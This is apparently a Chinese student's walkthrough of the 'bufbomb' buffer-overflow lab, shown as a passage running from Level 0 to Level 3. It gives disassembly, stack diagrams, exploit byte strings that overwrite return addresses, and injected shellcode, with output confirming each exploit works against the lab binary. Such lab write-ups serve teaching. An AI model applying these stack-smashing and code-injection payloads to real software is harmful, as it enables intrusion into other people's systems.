class="hljs-number">0</span>x<span class="hljs-number">28</span>(%ebp),%eax<br> <span class="hljs-attribute">80491fd</span>:<span class="hljs-number">89</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span>             mov    %eax,(%esp)<br> <span class="hljs-attribute">8049200</span>:e<span class="hljs-number">8</span> f<span class="hljs-number">5</span> fa ff ff       call   <span class="hljs-number">8048</span>cfa &lt;Gets&gt;<br> <span class="hljs-attribute">8049205</span>:b<span class="hljs-number">8</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,%eax<br> <span class="hljs-attribute">804920a</span>:c<span class="hljs-number">9</span>                   leave  <br> <span class="hljs-attribute">804920b</span>:c<span class="hljs-number">3</span>                   ret    <br><br></code></pre></td></tr></table></figure><p>栈帧结构图</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><br><br> high         ┌───────────┐<br>              │           │<br>              │   cookie  │<br>              ├───────────┤<br>              │           │<br>              │           │<br>              ├───────────┤<br>              │           │<br>              │return <span class="hljs-keyword">addr│</span><br><span class="hljs-keyword"></span>              │           │<br>              ├───────────┤<br>              │           │<br>ebp  ─────►   │ old ebp   │<br>              │           │<br>              ├───────────┤<br>              │           │<br>              │           │<br>              │   <span class="hljs-keyword">buf </span>    │<br>              │           │<br>              │           │<br>              │           │<br>              │           │<br>              │           │<br>              ├───────────┤<br>              │           │<br>              │ ...<span class="hljs-keyword">buf[0] </span>│<br>              └───────────┘<br> low<br><br></code></pre></td></tr></table></figure><p>exploit.txt</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-symbol">50 </span><span class="hljs-number">8</span>b <span class="hljs-number">04</span> <span class="hljs-number">08</span> /*小端序*/<br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat exploit.txt | ./hex2raw  | ./bufbomb -u nmsl<br><br>Userid: nmsl<br>Cookie: 0x6185560e<br>Type string:Smoke!: You called smoke()<br>VALID<br>NICE JOB!<br></code></pre></td></tr></table></figure><h1 id="level-1-Sparkler（10-pts）"><a href="#level-1-Sparkler（10-pts）" class="headerlink" title="level 1 Sparkler（10 pts）"></a>level 1 Sparkler（10 pts）</h1><p>执行fizz函数，且该函数有一个参数，也即是在level 0的基础上加了一个函数参数</p><p>我的cookie：0x6185560e</p><p>反汇编得到fizz的地址：08048c42</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">disas</span> fizz<br><br><span class="hljs-attribute">08048c42</span> &lt;fizz&gt;:<br> <span class="hljs-attribute">8048c42</span>:<span class="hljs-number">55</span>                   push   %ebp<br> <span class="hljs-attribute">8048c43</span>:<span class="hljs-number">89</span> e<span class="hljs-number">5</span>                mov    %esp,%ebp<br> <span class="hljs-attribute">8048c45</span>:<span class="hljs-number">83</span> ec <span class="hljs-number">18</span>             sub    $<span class="hljs-number">0</span>x<span class="hljs-number">18</span>,%esp<br> <span class="hljs-attribute">8048c48</span>:<span class="hljs-number">8</span>b <span class="hljs-number">45</span> <span class="hljs-number">08</span>             mov    <span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%ebp),%eax<br> <span class="hljs-attribute">8048c4b</span>:<span class="hljs-number">3</span>b <span class="hljs-number">05</span> <span class="hljs-number">08</span> d<span class="hljs-number">1</span> <span class="hljs-number">04</span> <span class="hljs-number">08</span>    cmp    <span class="hljs-number">0</span>x<span class="hljs-number">804</span>d<span class="hljs-number">108</span>,%eax<br> <span class="hljs-attribute">8048c51</span>:<span class="hljs-number">75</span> <span class="hljs-number">26</span>                jne    <span class="hljs-number">8048</span>c<span class="hljs-number">79</span> &lt;fizz+<span class="hljs-number">0</span>x<span class="hljs-number">37</span>&gt;<br> <span class="hljs-attribute">8048c53</span>:<span class="hljs-number">89</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>          mov    %eax,<span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%esp)<br> <span class="hljs-attribute">8048c57</span>:c<span class="hljs-number">7</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">04</span> ee a<span class="hljs-number">4</span> <span class="hljs-number">04</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">804</span>a<span class="hljs-number">4</span>ee,<span class="hljs-number">0</span>x<span class="hljs-number">4</span>(%esp)<br> <span class="hljs-attribute">8048c5e</span>:<span class="hljs-number">08</span> <br> <span class="hljs-attribute">8048c5f</span>:c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,(%esp)<br> <span class="hljs-attribute">8048c66</span>:e<span class="hljs-number">8</span> <span class="hljs-number">55</span> fd ff ff       call   <span class="hljs-number">80489</span>c<span class="hljs-number">0</span> &lt;__printf_chk@plt&gt;<br> <span class="hljs-attribute">8048c6b</span>:c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,(%esp)<br> <span class="hljs-attribute">8048c72</span>:e<span class="hljs-number">8</span> <span class="hljs-number">04</span> <span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       call   <span class="hljs-number">804937</span>b &lt;validate&gt;<br> <span class="hljs-attribute">8048c77</span>:eb <span class="hljs-number">18</span>                jmp    <span class="hljs-number">8048</span>c<span class="hljs-number">91</span> &lt;fizz+<span class="hljs-number">0</span>x<span class="hljs-number">4</span>f&gt;<br> <span class="hljs-attribute">8048c79</span>:<span class="hljs-number">89</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>          mov    %eax,<span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%esp)<br> <span class="hljs-attribute">8048c7d</span>:c<span class="hljs-number">7</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">04</span> <span class="hljs-number">40</span> a<span class="hljs-number">3</span> <span class="hljs-number">04</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">804</span>a<span class="hljs-number">340</span>,<span class="hljs-number">0</span>x<span class="hljs-number">4</span>(%esp)<br> <span class="hljs-attribute">8048c84</span>:<span class="hljs-number">08</span> <br> <span class="hljs-attribute">8048c85</span>:c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,(%esp)<br> <span class="hljs-attribute">8048c8c</span>:e<span class="hljs-number">8</span> <span class="hljs-number">2</span>f fd ff ff       call   <span class="hljs-number">80489</span>c<span class="hljs-number">0</span> &lt;__printf_chk@plt&gt;<br> <span class="hljs-attribute">8048c91</span>:c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,(%esp)<br> <span class="hljs-attribute">8048c98</span>:e<span class="hljs-number">8</span> <span class="hljs-number">63</span> fc ff ff       call   <span class="hljs-number">8048900</span> &lt;exit@plt&gt;<br></code></pre></td></tr></table></figure><p>为什么return addr和参数之间需要填充四个字节？这涉及到栈回收时候的操作：</p><ul><li>mov %ebp，%esp 。将esp指向ebp所指，相当于回收栈分配的空间</li><li>pop ebp。恢复前栈指针，同时esp=esp+4，也即是指向返回地址。上面mov和pop语句可以用一个leave代替</li><li>ret指令相当于pop eip，因此esp=esp+4，也即是指向返回地址+4处。因此第一个参数是在return addr+8的位置</li></ul><p>要注意到push和pop指令都隐含着esp的改变</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">--------------------------------------------------------------<br><br>`mov %ebp，%esp`<br><br>     high         ┌───────────┐<br>                  │           │<br>                  │   cookie  │<br>                  ├───────────┤<br>                  │           │<br>                  │           │<br>                  ├───────────┤<br>                  │           │<br>                  │<span class="hljs-keyword">return</span> addr│<br>                  │           │<br>                  ├───────────┤<br>esp  ebp  ───► <br>---------------------------------------------------------------<br><br>`pop ebp`<br><br><br>    ebp  ───►<br><br>                  ┌───────────┐<br>                  │           │<br>                  │   cookie  │<br>                  ├───────────┤<br>                  │           │<br>                  │           │                  <br>                  ├───────────┤<br>                  │           │<br>    esp  ───►     │<span class="hljs-keyword">return</span> addr│<br>                  │           │<br>                  ├───────────┤<br><br>---------------------------------------------------------------<br>`ret` 也即是 `pop eip`<br>  <br>    ebp  ───►<br><br>                  ┌───────────┐<br>                  │           │<br>                  │   cookie  │<br>                  ├───────────┤<br>                  │           │<br>    esp  ───►     │           │                  <br>                  ├───────────┤<br>                  │           │<br>    eip  ───►     │<span class="hljs-keyword">return</span> addr│<br>                  │           │<br>                  ├───────────┤<br><br><br><br>```                <br><br>exploit.txt<br><br></code></pre></td></tr></table></figure><p>00 00 00 00<br>00 00 00 00<br>00 00 00 00<br>00 00 00 00<br>00 00 00 00<br>00 00 00 00<br>00 00 00 00<br>00 00 00 00<br>00 00 00 00<br>00 00 00 00<br>00 00 00 00<br>42 8c 04 08 /* 返回地址，小端序 <em>/<br>00 00 00 00 /</em> 见前面分析 <em>/<br>0e 56 85 61 /</em> cookie，也即是fizz函数的参数 */</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><br>输出<br><br>```<span class="hljs-built_in">shell</span><br>Userid: nmsl<br>Cookie: <span class="hljs-number">0x6185560e</span><br><span class="hljs-built_in">Type</span> <span class="hljs-keyword">string</span>:Fizz!: You called <span class="hljs-built_in">fizz</span>(<span class="hljs-number">0x6185560e</span>)<br>VALID<br>NICE JOB!<br></code></pre></td></tr></table></figure><h1 id="level-2-Firecracker-15-pts"><a href="#level-2-Firecracker-15-pts" class="headerlink" title="level 2 Firecracker(15 pts)"></a>level 2 Firecracker(15 pts)</h1><p>这一次我们需要调用函数bang，由于bang中会验证全局变量global_value是否等于cookie，因此需要在堆栈中注入代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> global_value = <span class="hljs-number">0</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">bang</span><span class="hljs-params">(<span class="hljs-keyword">int</span> val)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (global_value == cookie) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Bang!: You set global_value to 0x%x\n&quot;</span>, global_value);<br>        validate(<span class="hljs-number">2</span>);<br>    &#125; <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Misfire: global_value = 0x%x\n&quot;</span>, global_value);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>将返回地址修改为buf[0]的地址80491CC，getbuf函数将会跳到buf[0]，然后执行此处的代码</p></li><li><p>注入代码：</p><ul><li>修改global_value的值为cookie</li><li>将bang函数的地址压入栈，后跟一个ret指令</li></ul></li><li><p>反汇编得到bang的地址为0x08048c9d</p></li><li><p>global_value的地址为0x804d100</p></li><li><p>Userid: nmsl Cookie: 0x6185560e</p></li></ul><p>需要注入的代码：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">movl</span>  $<span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e,%eax<br><span class="hljs-attribute">movl</span> %eax,<span class="hljs-number">0</span>x<span class="hljs-number">804</span>d<span class="hljs-number">100</span>     //将正确的cookie赋给global_value<br><span class="hljs-attribute">push</span> $<span class="hljs-number">0</span>x<span class="hljs-number">08048</span>c<span class="hljs-number">9</span>d        //bang的地址压栈<br><span class="hljs-attribute">ret</span>                     //等同于 pop eip，跳转到bang并执行<br></code></pre></td></tr></table></figure><p>汇编<code> gcc -m32 -c 1.s</code></p><p>再使用objdump反汇编得到二进制代码</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Disassembly</span> of section .text:<br><br><span class="hljs-attribute">00000000</span> &lt;.text&gt;:<br>   <span class="hljs-attribute">0</span>:   b<span class="hljs-number">8</span> <span class="hljs-number">0</span>e <span class="hljs-number">56</span> <span class="hljs-number">85</span> <span class="hljs-number">61</span>          mov    $<span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e,%eax<br>   <span class="hljs-attribute">5</span>:   a<span class="hljs-number">3</span> <span class="hljs-number">00</span> d<span class="hljs-number">1</span> <span class="hljs-number">04</span> <span class="hljs-number">08</span>          mov    %eax,<span class="hljs-number">0</span>x<span class="hljs-number">804</span>d<span class="hljs-number">100</span><br>   <span class="hljs-attribute">a</span>:   ff <span class="hljs-number">35</span> <span class="hljs-number">9</span>d <span class="hljs-number">8</span>c <span class="hljs-number">04</span> <span class="hljs-number">08</span>       pushl  <span class="hljs-number">0</span>x<span class="hljs-number">8048</span>c<span class="hljs-number">9</span>d<br>  <span class="hljs-attribute">10</span>:   c<span class="hljs-number">3</span>                      ret    <br></code></pre></td></tr></table></figure><p>exploit.txt</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">b8</span> <span class="hljs-number">0</span>e <span class="hljs-number">56</span> <span class="hljs-number">85</span> <span class="hljs-number">61</span><br><span class="hljs-attribute">a3</span> <span class="hljs-number">00</span> d<span class="hljs-number">1</span> <span class="hljs-number">04</span> <span class="hljs-number">08</span><br><span class="hljs-attribute">68</span> <span class="hljs-number">9</span>d <span class="hljs-number">8</span>c <span class="hljs-number">04</span> <span class="hljs-number">08</span><br><span class="hljs-attribute">c3</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">28</span> <span class="hljs-number">38</span> <span class="hljs-number">68</span> <span class="hljs-number">55</span> //要注意这个缓冲区的首地址,buf[<span class="hljs-number">0</span>]在堆栈段<br></code></pre></td></tr></table></figure><p>验证：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cat</span> exploit.txt | ./hex<span class="hljs-number">2</span>raw  | ./bufbomb -u nmsl<br><br><span class="hljs-attribute">Userid</span>: nmsl<br><span class="hljs-attribute">Cookie</span>: <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">Type</span> string:Bang!: You set global_value to <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">VALID</span><br><span class="hljs-attribute">NICE</span> JOB!<br></code></pre></td></tr></table></figure><h1 id="Level-3-Dynamite-20-pts"><a href="#Level-3-Dynamite-20-pts" class="headerlink" title="Level 3: Dynamite (20 pts)"></a>Level 3: Dynamite (20 pts)</h1><p>之前的代码注入会破坏堆栈的栈平衡（比如覆盖了ebp的值），使得程序异常退出，level 3需要将在不改变程序执行流的情况下，改写getbuf函数的返回值，并返回到test函数中继续执行</p><ul><li>观察C语言代码，test函数call getbuf函数的下一条语句是，<code>if (local != uniqueval()) &#123;</code>，那么这就是从getbuf函数返回后要执行的代码的地址。为<code>0x8048dbe</code></li><li>getbuf原先的返回值是1，现在需要改为cookie的值，按照约定，返回值被保存在eax寄存器（也可以从test函数的反汇编结果观察验证）</li><li>ebp的值不能被改变，因此需要动态调试得到ebp的原始值。为<code>0x55683880</code></li><li>原先的return addr需要改为Gets函数所读入的字符串的地址<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><br><br><br><br><br>                       ┌───────────┐<br>                       │           │<br>                       │<span class="hljs-keyword">return</span> addr│ ───────────────────┐<br>                       │           │                    │<br>                       ├───────────┤                    │<br>                       │           │                    │<br>    cant be modifie    │ old ebp   │                    │<br>                       │           │                    │<br>                       ├───────────┤                    │<br>                       │           │                    │<br>                       │   ....    │                    │<br>                       ├───────────┤                    │<br>                       │           │                    │<br>                       │  ret      │                    │<br>                       ├───────────┤                    │<br>                       │  push     │                    │<br>                       │  retadd   │                    │<br>                       ├───────────┤                    │<br>                       │           │ ◄──────────────────┘<br>      buf[<span class="hljs-number">0</span>] addr      │  <span class="hljs-built_in">set</span> eax  │<br>                       └───────────┘<br><br><br><br><br> <span class="hljs-keyword">int</span> getbuf()<br> &#123;<br>    <span class="hljs-keyword">char</span> buf[NORMAL_BUFFER_SIZE];<br>    Gets(buf);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br> &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> val;<br>    <span class="hljs-comment">/* Put canary on stack to detect possible corruption */</span><br>    <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">int</span> local = uniqueval();<br><br>    val = getbuf();<br><br>    <span class="hljs-comment">/* Check for corrupted stack */</span><br>    <span class="hljs-keyword">if</span> (local != uniqueval()) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sabotaged!: the stack has been corrupted\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (val == cookie) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Boom!: getbuf returned 0x%x\n&quot;</span>, val);<br>        validate(<span class="hljs-number">3</span>);<br>    &#125; <br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Dud: getbuf returned 0x%x\n&quot;</span>, val);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>注入代码<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">movl</span>  $<span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e,%eax<br><span class="hljs-attribute">push</span> $<span class="hljs-number">0</span>x<span class="hljs-number">8048</span>dbe<br><span class="hljs-attribute">ret</span><br></code></pre></td></tr></table></figure>对应的二进制字节<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">Disassembly</span> of section .text:<br><br><span class="hljs-attribute">00000000</span> &lt;.text&gt;:<br>   <span class="hljs-attribute">0</span>:   b<span class="hljs-number">8</span> <span class="hljs-number">0</span>e <span class="hljs-number">56</span> <span class="hljs-number">85</span> <span class="hljs-number">61</span>          mov    $<span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e,%eax<br>   <span class="hljs-attribute">5</span>:   <span class="hljs-number">68</span> be <span class="hljs-number">8</span>d <span class="hljs-number">04</span> <span class="hljs-number">08</span>          push   $<span class="hljs-number">0</span>x<span class="hljs-number">8048</span>dbe<br>   <span class="hljs-attribute">a</span>:   c<span class="hljs-number">3</span>                      ret    <br></code></pre></td></tr></table></figure></li></ul><p>exploit.txt</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">b8</span> <span class="hljs-number">0</span>e <span class="hljs-number">56</span> <span class="hljs-number">85</span> <span class="hljs-number">61</span><br><span class="hljs-attribute">68</span> be <span class="hljs-number">8</span>d <span class="hljs-number">04</span> <span class="hljs-number">08</span><br><span class="hljs-attribute">c3</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">80</span> <span class="hljs-number">38</span> <span class="hljs-number">68</span> <span class="hljs-number">55</span><br><span class="hljs-attribute">28</span> <span class="hljs-number">38</span> <span class="hljs-number">68</span> <span class="hljs-number">55</span><br></code></pre></td></tr></table></figure><p>测试</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cat</span> exploit.txt | ./hex<span class="hljs-number">2</span>raw  | ./bufbomb -u nmsl<br><br><span class="hljs-attribute">Userid</span>: nmsl<br><span class="hljs-attribute">Cookie</span>: <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">Type</span> 